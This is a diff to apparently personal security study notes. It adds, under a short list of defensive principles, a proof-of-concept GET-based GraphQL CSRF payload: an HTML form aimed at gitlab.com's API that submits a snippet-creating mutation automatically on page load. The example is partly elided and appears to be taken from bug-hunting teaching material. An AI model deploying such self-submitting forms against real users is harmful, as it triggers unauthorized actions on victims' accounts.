@@ -120,3 +120,10 @@ Input Validation - allow list and block list
 Network segmentation, staging shouldn't access prod 
 Threat Modelling in dev 
 Least privilege principle 
+
+GET-based GraphQL CSRF 
+<form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET"> 1
+<input name= 2 "query" value="mutation CreateSnippet($input: CreateSnippetInput!) --snip--">
+<input name= 3 "variables" value='{"input":{"title":"Tesssst Snippet"} --snip--'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script> 4
